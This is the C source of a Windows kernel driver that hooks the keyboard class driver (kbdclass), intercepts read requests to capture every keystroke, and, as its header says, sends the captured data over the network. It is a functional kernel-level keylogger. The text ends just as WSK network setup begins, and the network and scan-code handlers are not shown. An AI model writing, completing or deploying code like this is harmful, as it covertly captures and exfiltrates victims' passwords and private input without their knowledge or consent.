/*++

Module Name:
    driver_main.c

Abstract:
    Main driver implementation for keyboard input filtering and logging.
    This driver intercepts keyboard class driver (kbdclass.sys) read
    requests and processes keyboard input data before forwarding it
    to the original recipient.

    The driver works by:
    1. Hooking into the keyboard class driver's device objects
    2. Intercepting IRP_MJ_READ requests
    3. Processing keyboard scan codes
    4. Transmitting data over the network
    5. Forwarding IRPs to the original handler

Environment:
    Kernel mode only.

--*/

#include "driver.h"
#include "network.h"
#include "scancode.h"


//
// Global Driver Device Object
//
PDEVICE_OBJECT g_FilterDeviceObject = NULL;

//
// Architecture-Specific Constants
//
#ifdef _WIN64
    #define REMOVE_LOCK_OFFSET_DE      KBDCLASS_REMOVELOCK_OFFSET
    #define SPIN_LOCK_OFFSET_DE        KBDCLASS_SPINLOCK_OFFSET
    #define READ_QUEUE_OFFSET_DE       KBDCLASS_READQUEUE_OFFSET
#else
    #define REMOVE_LOCK_OFFSET_DE      KBDCLASS_REMOVELOCK_OFFSET
    #define SPIN_LOCK_OFFSET_DE        KBDCLASS_SPINLOCK_OFFSET
    #define READ_QUEUE_OFFSET_DE       KBDCLASS_READQUEUE_OFFSET
#endif

//
// Driver Configuration
//
#define KBDDRIVER_THREAD_DELAY_INTERVAL    100000  // 10ms in 100-nanosecond units
#define KBDDRIVER_MAX_DEVICE_EXTENSION     sizeof(KBDDRIVER_DEVICE_EXTENSION)

/*++

Routine: KbdIrp_DeviceControl

Description:
    Handles IRP_MJ_DEVICE_CONTROL requests by forwarding them to the
    appropriate keyboard device object.

Arguments:
    DeviceObject    - Pointer to our filter device object
    Irp             - Pointer to the I/O request packet

Return Value:
    NTSTATUS from IoCallDriver

--*/
NTSTATUS
KbdIrp_DeviceControl(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    NTSTATUS                        Status;
    PIO_STACK_LOCATION              IrpStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    
    UNREFERENCED_PARAMETER(DeviceObject);
    
    IrpStack = IoGetCurrentIrpStackLocation(Irp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    //
    // Find the keyboard object matching this file object
    //
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(
            ListEntry,
            KBDDRIVER_KEYBOARD_OBJECT,
            ListEntry
        );
        
        if (KeyboardObject->KbdFileObject == IrpStack->FileObject)
        {
            break;
        }
        
        ListEntry = ListEntry->Flink;
    }
    
    if (KeyboardObject == NULL)
    {
        KBD_ERROR("DeviceControl: Keyboard object not found for FileObject %p",
            IrpStack->FileObject);
        Status = STATUS_INVALID_PARAMETER;
        goto Exit;
    }
    
    //
    // Forward the request to the real keyboard device
    //
    IoSkipCurrentIrpStackLocation(Irp);
    
    Status = IoCallDriver(KeyboardObject->KbdDeviceObject, Irp);
    
    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("IoCallDriver failed in DeviceControl: 0x%08X", Status);
    }
    
Exit:
    
    return Status;
}

/*++

Routine: KbdIrp_Cancel

Description:
    Cancellation routine for pending read IRPs. This function is called
    when an IRP is cancelled (e.g., application closes or times out).

Arguments:
    DeviceObject    - Pointer to our filter device object
    Irp             - Pointer to the I/O request packet being cancelled

Return Value:
    None.

--*/
VOID
KbdIrp_Cancel(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    PIO_STACK_LOCATION              IrpStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    
    UNREFERENCED_PARAMETER(DeviceObject);
    
    //
    // Release the cancel spin lock
    //
    IoReleaseCancelSpinLock(Irp->CancelIrql);
    
    IrpStack = IoGetCurrentIrpStackLocation(Irp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    //
    // Find the keyboard object matching this file object
    //
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(
            ListEntry,
            KBDDRIVER_KEYBOARD_OBJECT,
            ListEntry
        );
        
        if (KeyboardObject->KbdFileObject == IrpStack->FileObject)
        {
            break;
        }
        
        ListEntry = ListEntry->Flink;
    }
    
    if (KeyboardObject == NULL)
    {
        KBD_ERROR("Cancel: Keyboard object not found for FileObject %p",
            IrpStack->FileObject);
        goto Exit;
    }
    
    //
    // Mark the IRP as cancelled and restore original device object
    //
    ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
    
    KeyboardObject->IrpCancel = TRUE;
    KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;
    
    ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
    
    //
    // Cancel the forwarded IRP if it exists
    //
    if (KeyboardObject->NewIrp != NULL)
    {
        IoCancelIrp(KeyboardObject->NewIrp);
    }
    
Exit:
    
    //
    // Complete the cancelled IRP
    //
    Irp->IoStatus.Status = STATUS_CANCELLED;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
}

/*++

Routine: KbdThread_HandleRead

Description:
    System thread that handles keyboard read operations. This thread:
    1. Creates a new IRP to forward to the real keyboard device
    2. Waits for the IRP to complete
    3. Processes keyboard input data
    4. Completes the original IRP

Arguments:
    StartContext - Pointer to the original IRP

Return Value:
    None. Thread terminates via PsTerminateSystemThread.

--*/
VOID
KbdThread_HandleRead(
    _In_ PVOID StartContext
)
{
    NTSTATUS                        Status;
    PIRP                            OriginalIrp;
    PIRP                            ForwardedIrp;
    PIO_STACK_LOCATION              OriginalStack;
    PIO_STACK_LOCATION              ForwardedStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    PIO_REMOVE_LOCK                 RemoveLock;
    PKEYBOARD_INPUT_DATA            InputData;
    
    if (StartContext == NULL)
    {
        KBD_ERROR("HandleRead: NULL StartContext");
        PsTerminateSystemThread(STATUS_INVALID_PARAMETER);
        return;
    }
    
    OriginalIrp = (PIRP)StartContext;
    OriginalStack = IoGetCurrentIrpStackLocation(OriginalIrp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    //
    // Find the keyboard object for this file object
    //
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(
            ListEntry,
            KBDDRIVER_KEYBOARD_OBJECT,
            ListEntry
        );
        
        if (KeyboardObject->KbdFileObject == OriginalStack->FileObject)
        {
            break;
        }
        
        ListEntry = ListEntry->Flink;
    }
    
    if (KeyboardObject == NULL)
    {
        KBD_ERROR("HandleRead: Keyboard object not found");
        Status = STATUS_INVALID_PARAMETER;
        goto Exit;
    }
    
    //
    // Release the remove lock if we acquired it
    //
    RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KeyboardObject->KbdDeviceObject->DeviceExtension 
        + REMOVE_LOCK_OFFSET_DE);
    
    if (OriginalIrp == KeyboardObject->RemoveLockIrp)
    {
        IoReleaseRemoveLock(RemoveLock, OriginalIrp);
        KeyboardObject->RemoveLockIrp = NULL;
    }
    
    //
    // Build a new IRP to forward to the keyboard device
    //
    ForwardedIrp = IoBuildSynchronousFsdRequest(
        IRP_MJ_READ,
        KeyboardObject->KbdDeviceObject,
        OriginalIrp->AssociatedIrp.SystemBuffer,
        OriginalStack->Parameters.Read.Length,
        &OriginalStack->Parameters.Read.ByteOffset,
        &KeyboardObject->Event,
        &OriginalIrp->IoStatus
    );
    
    if (ForwardedIrp == NULL)
    {
        KBD_ERROR("IoBuildSynchronousFsdRequest failed");
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Exit;
    }
    
    //
    // Initialize the forwarded IRP
    //
    KeClearEvent(ForwardedIrp->UserEvent);
    ForwardedIrp->Tail.Overlay.Thread = PsGetCurrentThread();
    ForwardedIrp->Tail.Overlay.AuxiliaryBuffer = NULL;
    ForwardedIrp->RequestorMode = KernelMode;
    ForwardedIrp->PendingReturned = FALSE;
    ForwardedIrp->Cancel = FALSE;
    ForwardedIrp->CancelRoutine = NULL;
    ForwardedIrp->Tail.Overlay.OriginalFileObject = NULL;
    ForwardedIrp->Overlay.AsynchronousParameters.UserApcRoutine = NULL;
    ForwardedIrp->Overlay.AsynchronousParameters.UserApcContext = NULL;
    
    //
    // Set up the stack location for the forwarded IRP
    //
    ForwardedStack = IoGetNextIrpStackLocation(ForwardedIrp);
    ForwardedStack->FileObject = KeyboardObject->KbdFileObject;
    ForwardedStack->Parameters.Read.Key = OriginalStack->Parameters.Read.Key;
    
    //
    // Store the forwarded IRP reference
    //
    ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
    KeyboardObject->NewIrp = ForwardedIrp;
    ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
    
    //
    // Send the IRP to the keyboard device
    //
    Status = IoCallDriver(KeyboardObject->KbdDeviceObject, ForwardedIrp);
    
    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("IoCallDriver failed in HandleRead: 0x%08X", Status);
    }
    
    //
    // Wait for the IRP to complete if it's pending
    //
    if (Status == STATUS_PENDING)
    {
        KeWaitForSingleObject(
            ForwardedIrp->UserEvent,
            Executive,
            KernelMode,
            FALSE,
            NULL
        );
        
        Status = OriginalIrp->IoStatus.Status;
    }
    
    //
    // Check if the operation was cancelled
    //
    if (KeyboardObject->IrpCancel)
    {
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        goto Exit;
    }
    else
    {
        IoSetCancelRoutine(OriginalIrp, NULL);
    }
    
    //
    // Process keyboard input data
    //
    if (NT_SUCCESS(OriginalIrp->IoStatus.Status) && 
        OriginalIrp->IoStatus.Information > 0)
    {
        OriginalStack->Parameters.Read.Length = (ULONG)OriginalIrp->IoStatus.Information;
        InputData = (PKEYBOARD_INPUT_DATA)OriginalIrp->AssociatedIrp.SystemBuffer;
        
        //
        // Iterate through all keyboard input data structures
        //
        while ((PCHAR)InputData < (PCHAR)OriginalIrp->AssociatedIrp.SystemBuffer + 
            OriginalIrp->IoStatus.Information)
        {
            //
            // Process each scan code (now uses line buffering)
            //
            KbdHandler_ProcessScanCode(InputData);
            KbdHandler_ConfigureMapping(InputData);
            
            InputData++;
        }
        
        //
        // Mark as safe to unload
        //
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        
        //
        // Complete the original IRP
        //
        IoCompleteRequest(OriginalIrp, IO_KEYBOARD_INCREMENT);
    }
    else
    {
        //
        // Mark as safe to unload
        //
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        
        IoCompleteRequest(OriginalIrp, IO_NO_INCREMENT);
    }
    
Exit:
    
    PsTerminateSystemThread(Status);
}

/*++

Routine: KbdIrp_Read

Description:
    Handles IRP_MJ_READ requests by intercepting keyboard input data,
    processing it, and forwarding to the original keyboard device.

Arguments:
    DeviceObject    - Pointer to our filter device object
    Irp             - Pointer to the I/O request packet

Return Value:
    STATUS_PENDING if operation is asynchronous, otherwise appropriate NTSTATUS.

--*/
NTSTATUS
KbdIrp_Read(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PIO_STACK_LOCATION IrpStack;
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    PLIST_ENTRY ListEntry;
    HANDLE ThreadHandle = NULL;

    UNREFERENCED_PARAMETER(DeviceObject);

    IrpStack = IoGetCurrentIrpStackLocation(Irp);

    //
    // Validate read parameters
    //
    if (IrpStack->Parameters.Read.Length == 0)
    {
        Status = STATUS_SUCCESS;
    }
    else if (IrpStack->Parameters.Read.Length % sizeof(KEYBOARD_INPUT_DATA))
    {
        Status = STATUS_BUFFER_TOO_SMALL;
    }
    else
    {
        //
        // We only allow a trusted subsystem with the appropriate privilege
        // level to execute a Read call.
        //
        Status = STATUS_PENDING;
    }

    //
    // If status is pending, mark the packet pending and start the packet
    // in a cancellable state. Otherwise, complete the request.
    //
    Irp->IoStatus.Status = Status;
    Irp->IoStatus.Information = 0;

    if (Status == STATUS_PENDING)
    {
        IoSetCancelRoutine(Irp, KbdIrp_Cancel);

        if (Irp->Cancel)
        {
            Status = STATUS_CANCELLED;
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            goto Exit;
        }

        //
        // Update keyboard object state
        //
        ListEntry = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead.Flink;

        while (ListEntry != &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead)
        {
            KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);

            if (KeyboardObject->KbdFileObject == IrpStack->FileObject)
            {
                ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
                KeyboardObject->SafeUnload = FALSE;
                ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
                break;
            }

            ListEntry = ListEntry->Flink;
        }

        IoMarkIrpPending(Irp);

        //
        // Create system thread to handle the read operation
        //
        Status = PsCreateSystemThread(
            &ThreadHandle,
            THREAD_ALL_ACCESS,
            NULL,
            NULL,
            NULL,
            KbdThread_HandleRead,
            Irp);
        
        if (!NT_SUCCESS(Status))
        {
            KBD_ERROR("PsCreateSystemThread KbdThread_HandleRead failed: 0x%08X", Status);
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            goto Exit;
        }

        if (ThreadHandle != NULL)
        {
            ZwClose(ThreadHandle);
            ThreadHandle = NULL;
        }

        return STATUS_PENDING;
    }
    else
    {
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
    }

Exit:
    return Status;
}

/*++

Routine: KbdDriver_DequeueRead

Description:
    Dequeues the next available read IRP regardless of FileObject

Assumptions:
    DeviceExtension->SpinLock is already held (so no further sync is required).

Arguments:
    DeviceExtension - Pointer to keyboard device extension

Return Value:
    Pointer to dequeued IRP, or NULL if queue is empty.

--*/
PIRP
KbdDriver_DequeueRead(
    _In_ PCHAR DeviceExtension
)
{
    ASSERT(DeviceExtension != NULL);

    PIRP NextIrp = NULL;
    LIST_ENTRY* ReadQueue = (LIST_ENTRY*)(DeviceExtension + READ_QUEUE_OFFSET_DE);

    while (!NextIrp && !IsListEmpty(ReadQueue))
    {
        PDRIVER_CANCEL OldCancelRoutine;
        PLIST_ENTRY ListEntry = RemoveHeadList(ReadQueue);

        //
        // Get the next IRP off the queue and clear the cancel routine
        //
        NextIrp = CONTAINING_RECORD(ListEntry, IRP, Tail.Overlay.ListEntry);
        OldCancelRoutine = IoSetCancelRoutine(NextIrp, NULL);

        //
        // IoCancelIrp() could have just been called on this IRP.
        // What we're interested in is not whether IoCancelIrp() was called
        // (ie, NextIrp->Cancel is set), but whether IoCancelIrp() called (or
        // is about to call) our cancel routine. To check that, check the result
        // of the test-and-set macro IoSetCancelRoutine.
        //
        if (OldCancelRoutine)
        {
            //
            // Cancel routine not called for this IRP. Return this IRP.
            //
            /*ASSERT(OldCancelRoutine == KeyboardClassCancel);*/
        }
        else
        {
            //
            // This IRP was just cancelled and the cancel routine was (or will
            // be) called. The cancel routine will complete this IRP as soon as
            // we drop the spinlock. So don't do anything with the IRP.
            //
            // Also, the cancel routine will try to dequeue the IRP, so make the
            // IRP's listEntry point to itself.
            //
            //ASSERT(NextIrp->Cancel);
            InitializeListHead(&NextIrp->Tail.Overlay.ListEntry);
            NextIrp = NULL;
        }
    }

    return NextIrp;
}

/*++

Routine: KbdThread_IrpHookInit

Description:
    System thread that initializes IRP hooking for keyboard devices.
    This thread periodically scans for new keyboard devices and hooks them.

Arguments:
    StartContext - Unused parameter

Return Value:
    None. Thread terminates via PsTerminateSystemThread.

--*/
VOID
KbdThread_IrpHookInit(
    _In_ PVOID StartContext
)
{
    UNREFERENCED_PARAMETER(StartContext);

    NTSTATUS Status = STATUS_SUCCESS;
    PDEVICE_OBJECT KbdDeviceObject = NULL;
    PLIST_ENTRY ListEntry;
    PCHAR KbdDeviceExtension = NULL;
    PIO_REMOVE_LOCK RemoveLock = NULL;
    PKSPIN_LOCK SpinLock = NULL;
    KIRQL Irql;
    PIRP Irp = NULL;
    PIO_STACK_LOCATION IrpStack;
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    HANDLE ThreadHandle = NULL;
    LARGE_INTEGER Interval;

    //
    // Initialize delay interval (100ms)
    //
    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL;

    while (!((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading)
    {
        KbdDeviceObject = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject->DeviceObject;

        while (KbdDeviceObject != NULL)
        {
            //
            // Check if we already have a keyboard object for this device
            //
            ListEntry = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead.Flink;
            KeyboardObject = NULL;

            while (ListEntry != &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead)
            {
                KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);

                if (KeyboardObject->KbdDeviceObject == KbdDeviceObject)
                {
                    break;
                }

                ListEntry = ListEntry->Flink;
            }

            if (KeyboardObject != NULL && KeyboardObject->KbdDeviceObject == KbdDeviceObject)
            {
                KbdDeviceObject = KbdDeviceObject->NextDevice;
                continue;
            }

            KbdDeviceExtension = KbdDeviceObject->DeviceExtension;
            RemoveLock = (PIO_REMOVE_LOCK)(KbdDeviceExtension + REMOVE_LOCK_OFFSET_DE);
            SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);

            //
            // Dequeue a read IRP from the keyboard device
            //
            KeAcquireSpinLock(SpinLock, &Irql);
            Irp = KbdDriver_DequeueRead(KbdDeviceExtension);
            KeReleaseSpinLock(SpinLock, Irql);

            if (Irp == NULL)
            {
                KbdDeviceObject = KbdDeviceObject->NextDevice;
                continue;
            }

            IoSetCancelRoutine(Irp, KbdIrp_Cancel);

            IrpStack = IoGetCurrentIrpStackLocation(Irp);

            //
            // Create new keyboard object
            //
            KeyboardObject = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KBDDRIVER_KEYBOARD_OBJECT), KBDDRIVER_POOL_TAG);

            if (KeyboardObject == NULL)
            {
                KBD_ERROR("ExAllocatePool2 KeyboardObject failed");
                Status = STATUS_INSUFFICIENT_RESOURCES;
                goto Cleanup;
            }

            RtlZeroMemory(KeyboardObject, sizeof(KBDDRIVER_KEYBOARD_OBJECT));

            //
            // Initialize keyboard object
            //
            KeyboardObject->SafeUnload = FALSE;
            KeyboardObject->RemoveLockIrp = Irp;
            KeyboardObject->KbdFileObject = IrpStack->FileObject;
            KeyboardObject->BttmDeviceObject = IrpStack->FileObject->DeviceObject;
            KeyboardObject->KbdDeviceObject = KbdDeviceObject;

            KeInitializeEvent(&KeyboardObject->Event, SynchronizationEvent, FALSE);
            ExInitializeResourceLite(&KeyboardObject->Resource);

            //
            // Hook the file object to point to our device
            //
            KeyboardObject->KbdFileObject->DeviceObject = g_FilterDeviceObject;

            //
            // Update stack size
            //
            g_FilterDeviceObject->StackSize = max(KeyboardObject->BttmDeviceObject->StackSize, g_FilterDeviceObject->StackSize);

            //
            // Add keyboard object to global list
            //
            ExInterlockedInsertTailList(
                &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead,
                &KeyboardObject->ListEntry,
                &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

            KeyboardObject->InitSuccess = TRUE;

            KBD_INFO("Keyboard object created: Filter=%p, Keyboard=%p, Bottom=%p, File=%p",
                g_FilterDeviceObject,
                KeyboardObject->KbdDeviceObject,
                KeyboardObject->BttmDeviceObject,
                KeyboardObject->KbdFileObject);

            //
            // Create thread to handle the read operation
            //
            Status = PsCreateSystemThread(
                &ThreadHandle,
                THREAD_ALL_ACCESS,
                NULL,
                NULL,
                NULL,
                KbdThread_HandleRead,
                Irp);

            if (!NT_SUCCESS(Status))
            {
                KBD_ERROR("PsCreateSystemThread KbdThread_HandleRead failed: 0x%08X", Status);
                goto Cleanup;
            }

            if (ThreadHandle != NULL)
            {
                ZwClose(ThreadHandle);
                ThreadHandle = NULL;
            }

            KbdDeviceObject = KbdDeviceObject->NextDevice;
            continue;

        Cleanup:
            if (!NT_SUCCESS(Status) && KeyboardObject != NULL)
            {
                if (!KeyboardObject->InitSuccess)
                {
                    if (KeyboardObject->KbdFileObject->DeviceObject != KeyboardObject->BttmDeviceObject)
                    {
                        KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;
                    }

                    ExDeleteResourceLite(&KeyboardObject->Resource);
                    ExFreePoolWithTag(KeyboardObject, KBDDRIVER_POOL_TAG);
                }
            }

            if (!NT_SUCCESS(Status) && Irp != NULL)
            {
                Irp->IoStatus.Status = 0;
                Irp->IoStatus.Information = 0;
                IoReleaseRemoveLock(RemoveLock, Irp);
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
            }

            KbdDeviceObject = KbdDeviceObject->NextDevice;
        }

        KeDelayExecutionThread(KernelMode, FALSE, &Interval);
    }

    PsTerminateSystemThread(Status);
}

/*++

Routine: KbdDriver_CleanupKeyboardObjects

Description:
    Cleans up all keyboard objects during driver unload.
    Ensures all resources are properly released and devices are restored.

Arguments:
    None.

Return Value:
    None.

--*/
VOID
KbdDriver_CleanupKeyboardObjects(
    VOID
)
{
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    PLIST_ENTRY ListEntry;
    PCHAR KbdDeviceExtension;
    PIO_REMOVE_LOCK RemoveLock;
    PKSPIN_LOCK SpinLock;
    KIRQL Irql;
    PIRP Irp;
    LARGE_INTEGER Interval;

    //
    // Initialize delay interval (100ms)
    //
    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL;

    while (!IsListEmpty(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead))
    {
        ListEntry = ExInterlockedRemoveHeadList(
            &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead,
            &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

        KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);

        if (!KeyboardObject->IrpCancel)
        {
            KbdDeviceExtension = KeyboardObject->KbdDeviceObject->DeviceExtension;
            RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KeyboardObject->KbdDeviceObject->DeviceExtension + REMOVE_LOCK_OFFSET_DE);
            SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);

            //
            // Dequeue any pending IRP
            //
            KeAcquireSpinLock(SpinLock, &Irql);
            Irp = KbdDriver_DequeueRead(KbdDeviceExtension);
            KeReleaseSpinLock(SpinLock, Irql);

            //
            // Restore original device object
            //
            KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;

            if (Irp != NULL)
            {
                Irp->IoStatus.Status = 0;
                Irp->IoStatus.Information = 0;
                IoReleaseRemoveLock(RemoveLock, Irp);
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
            }

            //
            // Wait for safe unload
            //
            while (!KeyboardObject->SafeUnload)
            {
                KeDelayExecutionThread(KernelMode, FALSE, &Interval);
            }

            KBD_INFO("Safe to unload: Filter=%p, Keyboard=%p, Bottom=%p, File=%p",
                g_FilterDeviceObject,
                KeyboardObject->KbdDeviceObject,
                KeyboardObject->BttmDeviceObject,
                KeyboardObject->KbdFileObject);
        }
        else
        {
            KBD_INFO("Device has been removed: Filter=%p, Keyboard=%p",
                g_FilterDeviceObject, KeyboardObject);
        }

        //
        // Cleanup resources
        //
        ExDeleteResourceLite(&KeyboardObject->Resource);

        if (KeyboardObject != NULL)
        {
            ExFreePoolWithTag(KeyboardObject, KBDDRIVER_POOL_TAG);
            KeyboardObject = NULL;
        }
    }

    //
    // Additional delay to ensure cleanup completion
    //
    KeDelayExecutionThread(KernelMode, FALSE, &Interval);
    KeDelayExecutionThread(KernelMode, FALSE, &Interval);
}

/*++

Routine: KbdDriver_Unload

Description:
    Driver unload routine. Cleans up all resources and unhooks all devices.

Arguments:
    DriverObject - Pointer to the driver object

Return Value:
    None.

--*/
VOID 
KbdDriver_Unload(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    UNREFERENCED_PARAMETER(DriverObject);

    KBD_INFO("Starting driver unload");

    //
    // Signal unloading to all threads
    //
    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading = TRUE;

    //
    // Cleanup all keyboard objects
    //
    KbdDriver_CleanupKeyboardObjects();
	
	//
	// Flush any remaining buffered lines
	//
	KbdHandler_FlushBuffer();

    //
    // Cleanup network resources
    //
    NetClient_Cleanup();
    WSKCleanup();

    //
    // Release driver object reference
    //
    if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject != NULL)
    {
        ObDereferenceObject(((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject);
        ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject = NULL;
    }

    //
    // Delete our device object
    //
    if (g_FilterDeviceObject != NULL)
    {
        IoDeleteDevice(g_FilterDeviceObject);
        g_FilterDeviceObject = NULL;
    }

    KBD_INFO("Driver unload completed");
}

/*++

Routine: DriverEntry

Description:
    DriverEntry initializes the driver and is the first routine called by the
    system after the driver is loaded. DriverEntry specifies the other entry
    points in the function driver, such as EvtDevice and DriverUnload.

Parameters Description:

    DriverObject - represents the instance of the function driver that is loaded
    into memory. DriverEntry must initialize members of DriverObject before it
    returns to the caller. DriverObject is allocated by the system before the
    driver is loaded, and it is released by the system after the system unloads
    the function driver from memory.

    RegistryPath - represents the driver specific path in the Registry.
    The function driver can use the path to store driver related data between
    reboots. The path does not store hardware instance specific data.

Return Value:

    STATUS_SUCCESS if successful,
    STATUS_UNSUCCESSFUL otherwise.

--*/
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS Status = STATUS_SUCCESS;
    UNICODE_STRING DriverName;
    PDRIVER_OBJECT KbdDriverObject = NULL;
    WSKDATA WSKData;
    HANDLE ThreadHandle = NULL;

    KBD_INFO("Starting driver initialization");

    //
    // Create our filter device object
    //
    RtlInitUnicodeString(&DriverName, L"\\KeyboardFilter");

    Status = IoCreateDevice(
        DriverObject,
        KBDDRIVER_MAX_DEVICE_EXTENSION,
        &DriverName,
        FILE_DEVICE_KEYBOARD,
        0,
        FALSE,
        &g_FilterDeviceObject);

    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("IoCreateDevice failed: 0x%08X", Status);
        goto Cleanup;
    }

    g_FilterDeviceObject->Flags |= DO_BUFFERED_IO;

    //
    // Get reference to kbdclass driver object
    //
    RtlInitUnicodeString(&DriverName, L"\\Driver\\Kbdclass");

    Status = ObReferenceObjectByName(
        &DriverName,
        OBJ_CASE_INSENSITIVE,
        NULL,
        FILE_ALL_ACCESS,
        *IoDriverObjectType,
        KernelMode,
        NULL,
        &KbdDriverObject);

    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("ObReferenceObjectByName %wZ failed: 0x%08X", &DriverName, Status);
        goto Cleanup;
    }

    //
    // Initialize device extension
    //
    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject = KbdDriverObject;
    InitializeListHead(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead);
    KeInitializeSpinLock(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

    //
    // Set up driver dispatch routines
    //
    DriverObject->MajorFunction[IRP_MJ_READ] = KbdIrp_Read;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KbdIrp_DeviceControl;
    DriverObject->DriverUnload = KbdDriver_Unload;

    //
    // Initialize WSK networking
    //
